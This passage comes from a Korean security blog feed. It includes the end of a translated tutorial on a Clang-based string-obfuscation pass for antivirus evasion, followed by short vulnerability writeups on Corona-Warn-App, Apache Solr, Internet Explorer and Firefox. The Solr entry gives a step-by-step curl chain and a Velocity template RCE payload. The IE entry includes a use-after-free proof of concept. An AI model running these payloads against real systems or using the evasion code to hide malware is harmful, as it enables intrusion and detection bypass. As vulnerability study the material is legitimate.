class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang;MatchHandler::MatchHandler(clang::Rewriter *rewriter) &#123;    <span class="hljs-keyword">this</span>-&gt;ASTRewriter = rewriter;&#125;</code></pre><p><code>run</code>의 구현은 아래와 같다:</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *Decl = Result.Nodes.getNodeAs&lt;clang::StringLiteral&gt;(<span class="hljs-string">&quot;decl&quot;</span>);    clang::SourceManager &amp;SM = ASTRewriter-&gt;getSourceMgr();    <span class="hljs-comment">// skip strings in included headers</span>    <span class="hljs-keyword">if</span> (!SM.isInMainFile(Decl-&gt;getBeginLoc()))        <span class="hljs-keyword">return</span>;    <span class="hljs-comment">// strings that comprise less than 5 characters are not worth the effort</span>    <span class="hljs-keyword">if</span> (!Decl-&gt;getBytes().str().size() &gt; <span class="hljs-number">4</span>) &#123;        <span class="hljs-keyword">return</span>;    &#125;    climbParentsIgnoreCast(*Decl, clang::ast_type_traits::DynTypedNode(), Result.Context, <span class="hljs-number">0</span>);&#125;</code></pre><p>위에서 짚고 넘어갈 세 가지가 있다:</p><ul><li><code>StringEncryptionConsumer</code>에서 정의된 패턴과 일치하는 AST 노드를 추출한다. 그러기 위해서 바인딩된 패턴 identifier를 인자로 문자열을 예상하는 <code>getNodeAs</code>를 호출할 수 있다.(<code>const auto Matcher = stringLiteral().bind(&quot;decl&quot;)</code>)</li><li>분석 중인 translation unit에서 정의되지 않은 문자열은 넘어간다. 실제 우리가 만든 pass는 시스템 헤더를 translation unit에 복사하는 <em>Clang</em>의 전처리기 이후에 실행된다.</li><li>이제 문자열 리터럴을 처리할 준비가 됐다. 문자열 리터럴이 어떤 context에서 발견됐는지 알아야 하므로 사용자 정의 함수에서 추출된 노드(위의 경우 <code>climbParentsIgnoreCase</code>)를 AST에 대한 참조를 포함한 <code>Result.Context</code>를 통해 전달한다. 목표는 흥미로운 노드를 찾을 때까지 위쪽의 트리를 탐색하는 것이다. 이 경우에서 흥미로운 노드는 <code>CallExpr</code> 타입이다.</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span>MatchHandler::climbParentsIgnoreCast(<span class="hljs-keyword">const</span> StringLiteral &amp;NodeString, clang::ast_type_traits::DynTypedNode node,                                     clang::ASTContext *<span class="hljs-keyword">const</span> pContext, <span class="hljs-keyword">uint64_t</span> iterations) &#123;    ASTContext::DynTypedNodeList parents = pContext-&gt;getParents(NodeString);    <span class="hljs-keyword">if</span> (iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = pContext-&gt;getParents(node);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;Cast&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">return</span> climbParentsIgnoreCast(NodeString, parent, pContext, ++iterations);        &#125;        handleStringInContext(&amp;NodeString, pContext, parent);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>간단히 말해서 이 함수는 흥미로운 것(“Cast”가 아닌 것)을 찾을 때 까지 <code>StringLiteral</code> 노드의 부모 노드들을 재귀적으로 탐색한다. <code>handleStringInContext</code>는 복잡하지 않다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleStringInContext</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                         <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    StringRef ParentNodeKind = node.getNodeKind().asStringRef();    <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;CallExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleCallExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;InitListExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleInitListExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> &#123;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Unhandled context &quot;</span> &lt;&lt; ParentNodeKind &lt;&lt; <span class="hljs-string">&quot; for string &quot;</span> &lt;&lt; pLiteral-&gt;getBytes() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;</code></pre><p>위 코드에서 눈에 띄는 건 실제로 처리되는 노드가 두 종류인 것이다. 또한 필요할 때 추가하는 게 쉬워야 한다. 실제로 두 경우 이미 비슷하게 처리되고 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *FunctionCall = node.get&lt;clang::CallExpr&gt;();    <span class="hljs-keyword">if</span> (isBlacklistedFunction(FunctionCall)) &#123;        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// exclude printf-like functions when the replacement is not constant anymore (C89 standard...).</span>    &#125;    handleExpr(pLiteral, pContext, node);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleInitListExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                      <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    handleExpr(pLiteral, pContext, node);&#125;</code></pre><h3 id="문자열-리터럴-교체"><a href="#문자열-리터럴-교체" class="headerlink" title="문자열 리터럴 교체"></a>문자열 리터럴 교체</h3><p><a href="https://clang.llvm.org/doxygen/classclang_1_1CallExpr.html"><code>CallExpr</code></a>과 <a href="https://clang.llvm.org/doxygen/classclang_1_1InitListExpr.html"><code>InitListExpr</code></a>은 비슷하게 처리되므로 둘 다 사용할 수 있는 공통적인 함수를 정의한다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::handleExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    clang::SourceRange LiteralRange = clang::SourceRange(            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getBeginLoc()),            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc())    );    <span class="hljs-keyword">if</span>(shouldAbort(pLiteral, pContext, LiteralRange))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = translateStringToIdentifier(pLiteral-&gt;getBytes().str());    <span class="hljs-keyword">if</span>(!insertVariableDeclaration(pLiteral, pContext, LiteralRange, Replacement))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> ;    Globs::PatchedSourceLocation.push_back(LiteralRange);    <span class="hljs-keyword">return</span> replaceStringLiteral(pLiteral, pContext, LiteralRange, Replacement);&#125;</code></pre><ul><li>변수명을 무작위로 생성한다.</li><li>가까운 위치에서 빈 공간을 찾고 변수 선언을 삽입해라. 이것은 기본적으로 <code>ASTRewriter→InsertText()</code>를 둘러싼 wrapper이다.</li><li>1단계에서 생성된 identifier를 가진 문자열을 바꾼다.</li><li>collection에 문자열 리터럴의 위치를 추가한다. 이는 <code>InitListExpr</code>를 지날 때 같은 문자열 리터럴을 두 번 표시해주므로 유용하다.(이유는 알 수 없다).</li></ul><p>마지막 단계는 실제 구현이 어렵기 때문에 먼저 보자.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::replaceStringLiteral</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        clang::SourceRange LiteralRange,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; Replacement)</span> </span>&#123;    <span class="hljs-comment">// handle &quot;TEXT&quot; macro argument, for instance LoadLibrary(TEXT(&quot;ntdll&quot;));</span>    <span class="hljs-keyword">bool</span> isMacro = ASTRewriter-&gt;getSourceMgr().isMacroBodyExpansion(pLiteral-&gt;getBeginLoc());    <span class="hljs-keyword">if</span> (isMacro) &#123;        StringRef OrigText = clang::Lexer::getSourceText(CharSourceRange(pLiteral-&gt;getSourceRange(), <span class="hljs-literal">true</span>),                                                         pContext-&gt;getSourceManager(), pContext-&gt;getLangOpts());        <span class="hljs-comment">// weird bug with TEXT Macro / other macros...there must be a proper way to do this.</span>        <span class="hljs-keyword">if</span> (OrigText.find(<span class="hljs-string">&quot;TEXT&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            ASTRewriter-&gt;RemoveText(LiteralRange);            LiteralRange.setEnd(ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc().getLocWithOffset(<span class="hljs-number">-1</span>)));        &#125;    &#125;    <span class="hljs-keyword">return</span> ASTRewriter-&gt;ReplaceText(LiteralRange, Replacement);&#125;</code></pre><p>보통 텍스트 교체는 <code>ReplaceText</code> API를 쓰지만 많은 버그가 발생했다. 매크로의 경우 Clang의 API는 불규칙하게 동작하여 복잡하다. 예를 들어 <code>isMacroBodyExpansion()</code>을 통한 확인이 없으면 인자가 아니라 <code>&quot;TEXT&quot;</code>가 교체된다. <code>LoadLibrary(TEXT(&quot;ntdll&quot;))</code>에서<code>LoadLibrary(your_variable(&quot;ntdll&quot;))</code>로 잘못 교체되는 것이다.</p><p>이유는 <code>&quot;TEXT&quot;</code>가 <em>Clang</em>의 전처리기에 의해 처리될 때 <code>L&quot;ntdll&quot;</code>을 교체하는 매크로이기 때문이다. transformation pass는 전처리기 작업이 완료된 후 발생하므로 <code>&quot;ntdll&quot;</code>의 시작과 끝 위치를 쿼리 하는 것은 몇 글자가 빠진 잘못된 값이 나올 수 있어서 유용하지 않다. 불행하게도 기존 translation unit에 실제 위치를 쿼리하는 것은 Clang API를 이용하였고 시행착오를 거쳐서 해결 방법을 찾았다.</p><h3 id="인접한-빈-공간에-변수-선언-삽입"><a href="#인접한-빈-공간에-변수-선언-삽입" class="headerlink" title="인접한 빈 공간에 변수 선언 삽입"></a>인접한 빈 공간에 변수 선언 삽입</h3><p>이제 문자열 리터럴을 변수 identifier로 바꿀 수 있으니 변수를 정의하고 원래 문자열로 할당해야 한다. 패치된 소스 코드에 아무것도 덮어쓰지 않고 <code>char your_variable[] = &quot;ntdll&quot;</code>을 해야 한다.</p><p>두 가지 시나리오가 있다:</p><ul><li>문자열 리터럴이 함수 바디 안에 위치한다.</li><li>문자열 리터럴이 함수 바디 밖에 위치한다.</li></ul><p>후자는 문자열 리터럴이 사용되는 표현식의 시작 부분을 찾으면 돼서 가장 간단하다.</p><p>전자는 포함된 함수를 찾아야 한다. 그 후 Clang은 API로 함수 바디의 시작 위치를 쿼리 한다. 변수가 전체 함수에서 볼 수 있고 우리가 삽입한 토큰이 내용을 덮어 씌우지 않으므로 변수 선언을 삽입할 공간으로 이상적이다.</p><p>어떤 경우든 두 가지 상황은 <code>FunctionDecl</code> 혹은 <code>VarDecl</code> 타입의 노드가 발견될 때까지 모든 부모 노드를 방문해서 해결한다.</p><pre><code class="hljs cpp">MatchHandler::findInjectionSpot(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,                                <span class="hljs-keyword">const</span> clang::StringLiteral &amp;Literal, <span class="hljs-keyword">bool</span> IsGlobal, <span class="hljs-keyword">uint64_t</span> Iterations) &#123;    <span class="hljs-keyword">if</span> (Iterations &gt; CLIMB_PARENTS_MAX_ITER)        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">std</span>::runtime_error(<span class="hljs-string">&quot;Reached max iterations when trying to find a function declaration&quot;</span>);    ASTContext::DynTypedNodeList parents = Context-&gt;getParents(Literal);;    <span class="hljs-keyword">if</span> (Iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = Context-&gt;getParents(Parent);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;FunctionDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">auto</span> FunDecl = parent.get&lt;clang::FunctionDecl&gt;();            <span class="hljs-keyword">auto</span> *Statement = FunDecl-&gt;getBody();            <span class="hljs-keyword">auto</span> *FirstChild = *Statement-&gt;child_begin();            <span class="hljs-keyword">return</span> &#123;FirstChild-&gt;getBeginLoc(), FunDecl-&gt;getEndLoc()&#125;;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;VarDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">if</span> (IsGlobal) &#123;                <span class="hljs-keyword">return</span> parent.get&lt;clang::VarDecl&gt;()-&gt;getSourceRange();            &#125;        &#125;        <span class="hljs-keyword">return</span> findInjectionSpot(Context, parent, Literal, IsGlobal, ++Iterations);    &#125;&#125;</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/SCRT/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..bash run_example.sh test/string_simplest.c</code></pre><p><img src="/2020/11/22/idioth/av_evasion_part1/4.png"></p><p>보다시피 잘 동작한다. 지금 이 예제는 정규식으로 해결할 만큼 코드가 짧다. </p><h2 id="Going-further"><a href="#Going-further" class="headerlink" title="Going further"></a>Going further</h2><p>지금은 obfuscation pass의 이름이 <code>StringEncryptor</code>이지만 실제로 문자열이 암호화되지 않는다. 문자열을 암호화하려면 얼마나 많은 노력이 필요할까?</p><h3 id="To-be-continued…"><a href="#To-be-continued…" class="headerlink" title="To be continued…"></a>To be continued…</h3><p>문자열을 난독화하는 것은 쉬운 부분이지만 Clang API에 익숙해야 한다. 소스 코드 문서를 보는데 1~2주 정도 쓰는 것을 추천한다.</p><p>다음 파트에서는 자동으로 API import를 숨기는 것에 대해 다룰 것이다.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>bypass</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>obfuscation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] German Corona-Warn-App sever RCE</title>
    <link href="/2020/11/21/fabu1ous/2020-11-21/"/>
    <url>/2020/11/21/fabu1ous/2020-11-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/securing-the-fight-against-covid19-through-oss">Securing the fight against COVID-19</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Corona-Warn-App(contect tracking infrastructure of Germany)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Corona-Warn-App(이하 CWA)은 독일의 접촉자 기록/추적 인프라입니다. 이 앱이 설치된 스마트폰은 블루투스로 식별 payload를 브로드케스트하고, 블루투스의 신호 범위 내에 들어온 다른 디바이스들이 이 payload와 payload를 받은 시각을 2주간 저장합니다. 양성 판정을 받은 사용자는 검사 결과와 이에 대한 키값(Diagnosis key)을 CWA server에 전송할 수 있습니다.</p><p>CWA 서버는 Spring boot 프레임워크로 동작하며 Diagnosis key를 받아 처리하는 과정에서 <a href="https://securitylab.github.com/research/bean-validation-RCE">Java Bean Validation</a> 취약점이 존재합니다. </p><p>Spring boot app이 입력받은 객체를 validate 한다는 것은 그 객체가 constraint 조건에 만족하는지 확인하는 동작을 뜻합니다. constraint 조건은 ‘@’를 통해 사용합니다.</p><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Input</span> </span>&#123;  <span class="hljs-meta">@Min(1)</span>  <span class="hljs-meta">@Max(10)</span>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num;    <span class="hljs-comment">//...</span>&#125;</code></pre><p>int형 num의 최솟값이 1, 최댓값이 10인 constraint 조건이 걸려있는 코드입니다. <code>@Min()</code>이나 <code>@Max()</code>처럼 built-in 조건만 있는 것이 아니라 custom constraint 또한 존재하고, 이를 이용한 validation을 custom constraint validation이라 부릅니다.</p><pre><code class="hljs powershell">input : ab<span class="hljs-variable">$</span>&#123;<span class="hljs-number">12</span>*<span class="hljs-number">12</span>&#125;<span class="hljs-built_in">cd</span>output : ab144<span class="hljs-built_in">cd</span></code></pre><p>custom constraint validation 동작 중 함수<code>buildConstraintViolationWithTemplate()</code>는 메세지 템플릿을 에러 메세지로 변환시켜줍니다. 메세지 템플릿에 <code>$&#123;&#125;</code>를 통해 Expression Language를 삽입할 수 있으며 그 실행결과가 에러 메세지에 반영됩니다. 만약 이 메세지 템플릿의 내용을 해커가 접근할 수 있다면 RCE 취약점입니다.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void add<span class="hljs-constructor">Violation(ConstraintValidatorContext <span class="hljs-params">validatorContext</span>, String <span class="hljs-params">message</span>)</span>&#123;    validatorContext.build<span class="hljs-constructor">ConstraintViolationWithTemplate(<span class="hljs-params">message</span>)</span>.add<span class="hljs-constructor">ConstraintViolation()</span>;&#125;</code></pre><p>CWA 서버는 <code>buildConstraintViolationWithTemplate()</code>을 호출하며 그 인자인 message는 사용자 입력값(Diagnosis key 속 데이터)이기 때문에 RCE 공격에 취약합니다. 사용자 입력을 sanitizing 하도록 패치되었지만, bypass가 가능하다는 평이 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>rce</tag>
      
      <tag>covid19</tag>
      
      <tag>ios</tag>
      
      <tag>germany</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</title>
    <link href="/2020/11/20/l0ch/2020-11-20/"/>
    <url>/2020/11/20/l0ch/2020-11-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957">CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Apache Solr 6.6.0-6.6.5<br>Apache Solr 7.0.0-7.7.3<br>Apache Solr 8.0.0-8.6.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Solr는 Apache Lucene을 기반으로 만들어진 검색 엔진입니다. 사용자는 특정 형식의 XML 파일을 서버에 업로드하여 인덱스를 생성하거나 검색 요청을 하여 결과를 XML 형식으로 얻을 수 있습니다.</p><p>이러한 Solr의 ConfigSet API 에 unauthrization config upload 가 가능해 RCE까지 이어질 수 있는 취약점이 발견되었습니다.</p><p>사용자는 ConfigSet API를 사용해 configset을 업로드하고 logical index를 구성하는 컬렉션을 생성할 수 있습니다. 이 때 원격 코드 실행에 악용될 수 있는 일부 기능들을 필터링해 악성 컬렉션이 구성되는 것을 방지합니다. 그러나 <code>configset.upload.enabled</code> 옵션이 true로 설정되어 있으면 이를 UPLOAD 와 CREATE 로 우회할 수 있습니다.</p><ol><li><p>먼저 악성 configset을 포함하는 압축 파일을 UPLOAD 합니다. </p> <pre><code class="hljs jsx">curl -X POST --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span>--data-binary@<span class="hljs-number">7.</span>zip <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=UPLOAD&amp;name=file1&quot;</span></code></pre></li><li><p>CREATE는 기존 configset을 기반으로 새로운 configset을 작성할 수 있습니다. 이를 이용해 UPLOAD된 configset을 기반으로 새로운 configset을 만들면 악용 가능한 기능들을 필터링을 하지 않아 인증 검사 로직을 우회할 수 있습니다.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=CREATE&amp;name=file3&amp;baseConfigSet=file1&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true&quot;</span></code></pre></li><li><p>2에서 얻은 새로운 configset를 기반으로 악성 컬렉션을 생성합니다.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/collections?action=CREATE&amp;numShards=1&amp;name=file2&amp;collection.configName=file3&quot;</span></code></pre></li><li><p>생성된 악성 컬렉션은 원격 코드 실행에 사용할 수 있습니다.</p> <pre><code class="hljs jsx">http:<span class="hljs-comment">//[host]/solr/newCollection3/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=&#x27;&#x27;)+%23set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span></code></pre></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.secpulse.com/archives/144081.html">https://www.secpulse.com/archives/144081.html</a></p><p><a href="https://issues.apache.org/jira/browse/SOLR-14925">https://issues.apache.org/jira/browse/SOLR-14925</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>apache solr</tag>
      
      <tag>unauthrization upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17053: Internet Explorer UAF 취약점</title>
    <link href="/2020/11/19/idioth/2020-11-19/"/>
    <url>/2020/11/19/idioth/2020-11-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Internet Explorer에서 neutering ArrayBuffer로 인한 use after free 취약점이 발견되었습니다. 해당 취약점은 CVE-2020-1380과 비슷한 취약점이지만 JIT 엔진 없이 트리거할 수 있습니다.</p><p>JIT 엔진을 사용하지 않고 item을 TypedArray로 변환할 때 <em>jscript.dll</em>은 interpreter에서 다음과 같은 작업을 수행합니다.</p><ol><li><code>Js::JavascriptConversion::ToNumber()</code> 호출</li><li>TypedArray의 ArrayBuffer가 detach 되었는지 확인</li><li>변환할 element의 index와 TypedArray의 길이 비교</li><li><code>Js::JavascriptConversion::ToNumber()</code>를 다시 호출하여 ArrayBuffer로 값 설정</li></ol><p><code>Js::JavascriptConversion::ToNumber()</code>의 첫 번째 호출에서 해커는 callback 함수를 통해 TypedArray의 ArrayBuffer를 free 할 수 있고 uaf를 발생시킬 수 있습니다. 이것을 막기 위해 첫 번째 호출 후 ArrayBuffer가 detach 되었는지 확인하여 user code callback에서 메모리가 free 되는 것을 방지합니다. 하지만 두 번째 호출에서는 별다른 검사를 하지 않기 때문에 이를 악용하여 uaf를 발생시킬 수 있습니다.</p><details><summary>POC Code</summary><p><pre><code class="hljs js"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float32Array</span>(<span class="hljs-number">0x100</span>);<span class="hljs-keyword">var</span> flag = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">index, value</span>) </span>&#123;    arr[index] = value;&#125;<span class="hljs-keyword">var</span> obj = &#123;&#125;;obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) &#123;        worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;&quot;</span>);        worker.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;;        worker.postMessage(<span class="hljs-number">0</span>, [arr.buffer]);        worker.terminate();        worker = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;    &#125;    flag = <span class="hljs-number">1</span>;&#125;;pwn(<span class="hljs-number">0</span>, obj);</code></pre></p></details><p>두 번째 인자를 <code>obj</code>로 <code>pwn</code> 함수를 호출하면 item을 TypedArray로 변환할 때 <code>Js::JavascriptConversion::ToNumber()</code>가 호출되어 callback 함수가 두 번 호출됩니다. 첫 번째 호출에는 <code>flag == 0</code>이므로 ArrayBuffer가 neutering 되지 않지만 두 번째 호출에서 ArrayBuffer가 neutering 됩니다. 두 번째 호출에서는 ArrayBuffer가 detach 되었는지 검사하지 않으므로 uaf가 발생합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>use after free</tag>
      
      <tag>idioth</tag>
      
      <tag>internet explorer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15647: website stealing files from device</title>
    <link href="/2020/11/18/fabu1ous/2020-11-18/"/>
    <url>/2020/11/18/fabu1ous/2020-11-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@kanytu/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d">Firefox: How a website could steal all your cookies</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firefox Fennec v68.9.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox Fennec에서 Arbitrary local file access 취약점(CVE-2020–15647)이 발견되었습니다. 이를 악용한 해커의 웹 사이트에 접속하면 핸드폰의 파일을 탈취당할 수 있습니다.</p><p>안드로이드용 <code>Firefox Content Provider</code>의 misconfigure로 인해 발생하는 취약점으로 Firefox에서 접근할 수 있는 모든 파일을 웹페이지가 읽을 수 있고 해커의 웹 서버로 내용을 전송할 수 있습니다. 취약점이 발생하는 이유는 다음과 같습니다.</p><ol><li><code>content://</code> URI로 파일을 열면 파일명을 바꾸지 않고 cache 한 뒤 그곳으로 redirect 합니다.</li><li><a href="https://developer.android.com/training/secure-file-sharing/setup-sharing">file content provider</a>의 공유 가능 디렉터리가 root-path로 설정돼있습니다.</li></ol><p>브라우저는 로컬 html 파일을 열 때 <code>content://</code> URI를 사용합니다. victim device에서 탈취하고자 하는 파일(이하 target)과 동일한 이름의 악성 html 파일을 업로드하고 실행하면 Firefox가 파일명을 유지한 채로 cache 합니다. 악성 html 파일은 브라우저가 target을 <code>content://</code>로 열게 하고 기존에 cache 된 파일이 target의 내용으로 overwrite 됩니다. 악성 html이 이를 파싱해 해커의 웹 서버로 전송할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>firefox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Samsung Neural Processing Unit memory corruption in shared memory parsing</title>
    <link href="/2020/11/17/l0ch/2020-11-17/"/>
    <url>/2020/11/17/l0ch/2020-11-17/</url>
    
